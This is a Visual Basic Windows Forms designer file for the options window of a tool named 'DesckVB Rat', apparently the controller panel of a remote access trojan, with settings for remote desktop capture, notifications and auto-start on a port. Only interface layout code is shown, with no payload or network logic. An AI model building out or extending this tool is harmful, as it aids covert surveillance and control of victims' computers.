<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class opções
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(opções))
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.CheckToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DescheckToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ExitToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.GroupBox4 = New System.Windows.Forms.GroupBox()
        Me.CheckBox4 = New System.Windows.Forms.CheckBox()
        Me.CheckBox2 = New System.Windows.Forms.CheckBox()
        Me.CheckBox5 = New System.Windows.Forms.CheckBox()
        Me.GroupBox5 = New System.Windows.Forms.GroupBox()
        Me.CheckBox7 = New System.Windows.Forms.CheckBox()
        Me.CheckBox6 = New System.Windows.Forms.CheckBox()
        Me.CheckBox1 = New System.Windows.Forms.CheckBox()
        Me.CheckBox3 = New System.Windows.Forms.CheckBox()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.ComboBox2 = New System.Windows.Forms.ComboBox()
        Me.ComboBox1 = New System.Windows.Forms.ComboBox()
        Me.CheckBox8 = New System.Windows.Forms.CheckBox()
        Me.Button1 = New System.Windows.Forms.Button()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.GroupBox1.SuspendLayout
        Me.ContextMenuStrip1.SuspendLayout
        Me.GroupBox4.SuspendLayout
        Me.GroupBox5.SuspendLayout
        Me.GroupBox3.SuspendLayout
        Me.GroupBox2.SuspendLayout
        Me.SuspendLayout
        '
        'GroupBox1
        '
        Me.GroupBox1.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink
        Me.GroupBox1.ContextMenuStrip = Me.ContextMenuStrip1
        Me.GroupBox1.Controls.Add(Me.GroupBox4)
        Me.GroupBox1.Controls.Add(Me.GroupBox5)
        Me.GroupBox1.Controls.Add(Me.GroupBox3)
        Me.GroupBox1.Cursor = System.Windows.Forms.Cursors.Cross
        Me.GroupBox1.ForeColor = System.Drawing.Color.Lime
        Me.GroupBox1.Location = New System.Drawing.Point(12, 12)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(606, 189)
        Me.GroupBox1.TabIndex = 4
        Me.GroupBox1.TabStop = false
        Me.GroupBox1.Text = "DesckVB Rat Opções"
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.CheckToolStripMenuItem, Me.DescheckToolStripMenuItem, Me.ExitToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(137, 70)
        '
        'CheckToolStripMenuItem
        '
        Me.CheckToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.CheckToolStripMenuItem.ForeColor = System.Drawing.Color.Red
        Me.CheckToolStripMenuItem.Image = CType(resources.GetObject("CheckToolStripMenuItem.Image"),System.Drawing.Image)
        Me.CheckToolStripMenuItem.Name = "CheckToolStripMenuItem"
        Me.CheckToolStripMenuItem.Size = New System.Drawing.Size(136, 22)
        Me.CheckToolStripMenuItem.Text = "Check Al"
        '
        'DescheckToolStripMenuItem
        '
        Me.DescheckToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.DescheckToolStripMenuItem.ForeColor = System.Drawing.Color.Red
        Me.DescheckToolStripMenuItem.Image = CType(resources.GetObject("DescheckToolStripMenuItem.Image"),System.Drawing.Image)
        Me.DescheckToolStripMenuItem.Name = "DescheckToolStripMenuItem"
        Me.DescheckToolStripMenuItem.Size = New System.Drawing.Size(136, 22)
        Me.DescheckToolStripMenuItem.Text = "Decheck Al "
        '
        'ExitToolStripMenuItem
        '
        Me.ExitToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.ExitToolStripMenuItem.ForeColor = System.Drawing.Color.Red
        Me.ExitToolStripMenuItem.Image = CType(resources.GetObject("ExitToolStripMenuItem.Image"),System.Drawing.Image)
        Me.ExitToolStripMenuItem.Name = "ExitToolStripMenuItem"
        Me.ExitToolStripMenuItem.Size = New System.Drawing.Size(136, 22)
        Me.ExitToolStripMenuItem.Text = "Exit"
        '
        'GroupBox4
        '
        Me.GroupBox4.Controls.Add(Me.CheckBox4)
        Me.GroupBox4.Controls.Add(Me.CheckBox2)
        Me.GroupBox4.Controls.Add(Me.CheckBox5)
        Me.GroupBox4.ForeColor = System.Drawing.Color.Lime
        Me.GroupBox4.Location = New System.Drawing.Point(420, 19)
        Me.GroupBox4.Name = "GroupBox4"
        Me.GroupBox4.Size = New System.Drawing.Size(171, 152)
        Me.GroupBox4.TabIndex = 18
        Me.GroupBox4.TabStop = false
        Me.GroupBox4.Text = "Opções 02"
        '
        'CheckBox4
        '
        Me.CheckBox4.AutoSize = true
        Me.CheckBox4.ContextMenuStrip = Me.ContextMenuStrip1
        Me.CheckBox4.ForeColor = System.Drawing.Color.White
        Me.CheckBox4.Location = New System.Drawing.Point(6, 97)
        Me.CheckBox4.Name = "CheckBox4"
        Me.CheckBox4.Size = New System.Drawing.Size(136, 17)
        Me.CheckBox4.TabIndex = 8
        Me.CheckBox4.Text = "PC/User [Show / Hide]"
        Me.CheckBox4.UseVisualStyleBackColor = true
        '
        'CheckBox2
        '
        Me.CheckBox2.AutoSize = true
        Me.CheckBox2.ContextMenuStrip = Me.ContextMenuStrip1
        Me.CheckBox2.Cursor = System.Windows.Forms.Cursors.Cross
        Me.CheckBox2.ForeColor = System.Drawing.Color.White
        Me.CheckBox2.Location = New System.Drawing.Point(6, 22)
        Me.CheckBox2.Name = "CheckBox2"
        Me.CheckBox2.Size = New System.Drawing.Size(128, 17)
        Me.CheckBox2.TabIndex = 6
        Me.CheckBox2.Text = "Opacidade [Off / ON]"
        Me.CheckBox2.UseVisualStyleBackColor = true
        '
        'CheckBox5
        '
        Me.CheckBox5.AutoSize = true
        Me.CheckBox5.ContextMenuStrip = Me.ContextMenuStrip1
        Me.CheckBox5.ForeColor = System.Drawing.Color.White
        Me.CheckBox5.Location = New System.Drawing.Point(6, 60)
        Me.CheckBox5.Name = "CheckBox5"
        Me.CheckBox5.Size = New System.Drawing.Size(133, 17)
        Me.CheckBox5.TabIndex = 9
        Me.CheckBox5.Text = "Info Rat [Show / Hide]"
        Me.CheckBox5.UseVisualStyleBackColor = true
        '
        'GroupBox5
        '
        Me.GroupBox5.Controls.Add(Me.CheckBox7)
        Me.GroupBox5.Controls.Add(Me.CheckBox6)
        Me.GroupBox5.Controls.Add(Me.CheckBox1)
        Me.GroupBox5.Controls.Add(Me.CheckBox3)
        Me.GroupBox5.ForeColor = System.Drawing.Color.Lime
        Me.GroupBox5.Location = New System.Drawing.Point(13, 19)
        Me.GroupBox5.Name = "GroupBox5"
        Me.GroupBox5.Size = New System.Drawing.Size(193, 152)
        Me.GroupBox5.TabIndex = 18
        Me.GroupBox5.TabStop = false
        Me.GroupBox5.Text = "Opções 01"
        '
        'CheckBox7
        '
        Me.CheckBox7.AutoSize = true
        Me.CheckBox7.ForeColor = System.Drawing.Color.White
        Me.CheckBox7.Location = New System.Drawing.Point(6, 22)
        Me.CheckBox7.Name = "CheckBox7"
        Me.CheckBox7.Size = New System.Drawing.Size(116, 17)
        Me.CheckBox7.TabIndex = 13
        Me.CheckBox7.Text = "Minimized [Off/ON]"
        Me.CheckBox7.UseVisualStyleBackColor = true
        '
        'CheckBox6
        '
        Me.CheckBox6.AutoSize = true
        Me.CheckBox6.ContextMenuStrip = Me.ContextMenuStrip1
        Me.CheckBox6.ForeColor = System.Drawing.Color.White
        Me.CheckBox6.Location = New System.Drawing.Point(6, 91)
        Me.CheckBox6.Name = "CheckBox6"
        Me.CheckBox6.Size = New System.Drawing.Size(161, 17)
        Me.CheckBox6.TabIndex = 10
        Me.CheckBox6.Text = "Alto Start Porta [Start / Stop]"
        Me.CheckBox6.UseVisualStyleBackColor = true
        '
        'CheckBox1
        '
        Me.CheckBox1.AutoSize = true
        Me.CheckBox1.ContextMenuStrip = Me.ContextMenuStrip1
        Me.CheckBox1.ForeColor = System.Drawing.Color.White
        Me.CheckBox1.Location = New System.Drawing.Point(6, 57)
        Me.CheckBox1.Name = "CheckBox1"
        Me.CheckBox1.Size = New System.Drawing.Size(153, 17)
        Me.CheckBox1.TabIndex = 5
        Me.CheckBox1.Text = "Notificação [Show / Close]"
        Me.CheckBox1.UseVisualStyleBackColor = true
        '
        'CheckBox3
        '
        Me.CheckBox3.AutoSize = true
        Me.CheckBox3.ContextMenuStrip = Me.ContextMenuStrip1
        Me.CheckBox3.ForeColor = System.Drawing.Color.White
        Me.CheckBox3.Location = New System.Drawing.Point(6, 124)
        Me.CheckBox3.Name = "CheckBox3"
        Me.CheckBox3.Size = New System.Drawing.Size(184, 17)
        Me.CheckBox3.TabIndex = 5
        Me.CheckBox3.Text = "Som da Notificação [Som / Mute]"
        Me.CheckBox3.UseVisualStyleBackColor = true
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.Label3)
        Me.GroupBox3.Controls.Add(Me.Label2)
        Me.GroupBox3.Controls.Add(Me.Label1)
        Me.GroupBox3.Controls.Add(Me.ComboBox2)
        Me.GroupBox3.Controls.Add(Me.ComboBox1)
        Me.GroupBox3.Controls.Add(Me.CheckBox8)
        Me.GroupBox3.ForeColor = System.Drawing.Color.Lime
        Me.GroupBox3.Location = New System.Drawing.Point(212, 19)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(202, 152)
        Me.GroupBox3.TabIndex = 17
        Me.GroupBox3.TabStop = false
        Me.GroupBox3.Text = "Remote Descktop"
        '
        'Label3
        '
        Me.Label3.AutoSize = true
        Me.Label3.ForeColor = System.Drawing.Color.White
        Me.Label3.Location = New System.Drawing.Point(12, 73)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(93, 13)
        Me.Label3.TabIndex = 13
        Me.Label3.Text = "Remote Descktop"
        '
        'Label2
        '
        Me.Label2.AutoSize = true
        Me.Label2.ForeColor = System.Drawing.Color.White
        Me.Label2.Location = New System.Drawing.Point(12, 95)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(97, 13)
        Me.Label2.TabIndex = 16
        Me.Label2.Text = "Qualit 10 To 100 %"
        '
        'Label1
        '
        Me.Label1.AutoSize = true
        Me.Label1.ForeColor = System.Drawing.Color.White
        Me.Label1.Location = New System.Drawing.Point(124, 97)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(61, 13)
        Me.Label1.TabIndex = 15
        Me.Label1.Text = "Size 1 To 5"
        '
        'ComboBox2
        '
        Me.ComboBox2.BackColor = System.Drawing.Color.Black
        Me.ComboBox2.ForeColor = System.Drawing.Color.White
        Me.ComboBox2.FormattingEnabled = true
        Me.ComboBox2.Items.AddRange(New Object() {"100", "90", "80", "70", "60", "50", "40", "30", "20", "10"})
        Me.ComboBox2.Location = New System.Drawing.Point(15, 118)
        Me.ComboBox2.Name = "ComboBox2"
        Me.ComboBox2.Size = New System.Drawing.Size(60, 21)
        Me.ComboBox2.TabIndex = 14
        '
        'ComboBox1
        '
        Me.ComboBox1.BackColor = System.Drawing.Color.Black
        Me.ComboBox1.ForeColor = System.Drawing.Color.White
        Me.ComboBox1.FormattingEnabled = true
        Me.ComboBox1.Items.AddRange(New Object() {"1", "2", "3", "4", "5"})
        Me.ComboBox1.Location = New System.Drawing.Point(127, 120)
        Me.ComboBox1.Name = "ComboBox1"
        Me.ComboBox1.Size = New System.Drawing.Size(60, 21)
        Me.ComboBox1.TabIndex = 13
        '
        'CheckBox8
        '
        Me.CheckBox8.AutoSize = true
        Me.CheckBox8.ForeColor = System.Drawing.Color.White
        Me.CheckBox8.Location = New System.Drawing.Point(12, 35)
        Me.CheckBox8.Name = "CheckBox8"
        Me.CheckBox8.Size = New System.Drawing.Size(184, 17)
        Me.CheckBox8.TabIndex = 13
        Me.CheckBox8.Text = "Capture Descktop Brevia[Off/On]"
        Me.CheckBox8.UseVisualStyleBackColor = true
        '
        'Button1
        '
        Me.Button1.BackColor = System.Drawing.Color.Black
        Me.Button1.Font = New System.Drawing.Font("Microsoft Sans Serif", 15.75!, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, CType(0,Byte))
        Me.Button1.ForeColor = System.Drawing.Color.White
        Me.Button1.Image = CType(resources.GetObject("Button1.Image"),System.Drawing.Image)
        Me.Button1.Location = New System.Drawing.Point(12, 19)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(579, 46)
        Me.Button1.TabIndex = 11
        Me.Button1.Text = "Restart DesckVB Rat"
        Me.Button1.TextImageRelation = System.Windows.Forms.TextImageRelation.TextBeforeImage
        Me.Button1.UseVisualStyleBackColor = false
        '
        'GroupBox2
        '
        Me.GroupBox2.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink
        Me.GroupBox2.Controls.Add(Me.Button1)
        Me.GroupBox2.ForeColor = System.Drawing.Color.Lime
        Me.GroupBox2.Location = New System.Drawing.Point(12, 207)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(606, 77)
        Me.GroupBox2.TabIndex = 12
        Me.GroupBox2.TabStop = false
        Me.GroupBox2.Text = "Recomendado"
        '
        'opções
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6!, 13!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink
        Me.BackColor = System.Drawing.Color.Black
        Me.ClientSize = New System.Drawing.Size(632, 303)
        Me.ContextMenuStrip = Me.ContextMenuStrip1
        Me.Controls.Add(Me.GroupBox2)
        Me.Controls.Add(Me.GroupBox1)
        Me.Cursor = System.Windows.Forms.Cursors.Cross
        Me.ForeColor = System.Drawing.Color.Lime
        Me.Icon = CType(resources.GetObject("$this.Icon"),System.Drawing.Icon)
        Me.MaximizeBox = false
        Me.Name = "opções"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Opções Do DesckVB Rat"
        Me.GroupBox1.ResumeLayout(false)
        Me.ContextMenuStrip1.ResumeLayout(false)
        Me.GroupBox4.ResumeLayout(false)
        Me.GroupBox4.PerformLayout
        Me.GroupBox5.ResumeLayout(false)
        Me.GroupBox5.PerformLayout
        Me.GroupBox3.ResumeLayout(false)
        Me.GroupBox3.PerformLayout
        Me.GroupBox2.ResumeLayout(false)
        Me.ResumeLayout(false)

End Sub
    Friend WithEvents GroupBox1 As GroupBox
    Friend WithEvents CheckBox1 As CheckBox
    Friend WithEvents CheckBox2 As CheckBox
    Friend WithEvents CheckBox3 As CheckBox
    Friend WithEvents CheckBox4 As CheckBox
    Friend WithEvents CheckBox5 As CheckBox
    Friend WithEvents ContextMenuStrip1 As ContextMenuStrip
    Friend WithEvents CheckToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents DescheckToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ExitToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents CheckBox6 As CheckBox
    Friend WithEvents Button1 As Button
    Friend WithEvents GroupBox2 As GroupBox
    Friend WithEvents CheckBox7 As CheckBox
    Friend WithEvents CheckBox8 As CheckBox
    Friend WithEvents GroupBox3 As GroupBox
    Friend WithEvents ComboBox1 As ComboBox
    Friend WithEvents GroupBox4 As GroupBox
    Friend WithEvents GroupBox5 As GroupBox
    Friend WithEvents ComboBox2 As ComboBox
    Friend WithEvents Label2 As Label
    Friend WithEvents Label1 As Label
    Friend WithEvents Label3 As Label
End Class
